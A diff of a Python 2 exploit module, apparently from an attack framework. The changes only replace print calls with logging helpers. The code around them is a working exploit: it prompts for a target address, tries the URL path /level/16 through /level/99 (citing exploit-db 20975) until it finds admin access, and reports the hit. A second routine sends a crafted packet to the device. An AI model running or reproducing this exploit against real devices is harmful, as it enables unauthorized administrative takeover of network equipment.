@@ -1,4 +1,4 @@
-import util
+from util import Error, debug, Msg
 import socket, urllib
 
 #
@@ -20,13 +20,12 @@ def run ( run ):
 	if run == 1:
 		# http://www.exploit-db.com/exploits/20975/
 		tmp = vulnerabilities()[run-1]
-		print '[dbg] running ',tmp
 		while True:
 			try:
 				ip = raw_input('Enter address: ')
 				break
 			except:
-				print '[-] Error with input.'
+				Error("Error with input.")	
 				return
 		url = 'http://' + ip + '/level/'
 		for i in range(16, 100):
@@ -34,9 +33,9 @@ def run ( run ):
 			response = urllib.urlopen(url)
 			r = response.read()
 			if '200 ok' in r:
-				print '[+] Device vulnerable at %s.  Connect to %s for admin.'%(str(i), url)
+				Msg('Device vulnerable at %s.  Connect to %s for admin.'%(str(i), url))
 				return
-		print '[-] Sorry: the device at \'%s\' is not vulnerable.'%(ip)
+		Error('Sorry: the device at \'%s\' is not vulnerable.'%(ip))
 		return
 	
 	elif run == 2:
@@ -46,7 +45,7 @@ def run ( run ):
 				ip = raw_input('Enter address: ')
 				break
 			except:
-				print '[-] Error with input.'
+				Error('Error with input')	
 				return
 		
 		pkt = '\x00\x01'
@@ -60,7 +59,7 @@ def run ( run ):
 			data = skt.recv(1024)
 			skt.close()
 		except Exception, j:
-			print '[-] Error with host: ', j
+			Error('Error with host: %s'%j)
 			return
 
 		print '[+] Received from device: '
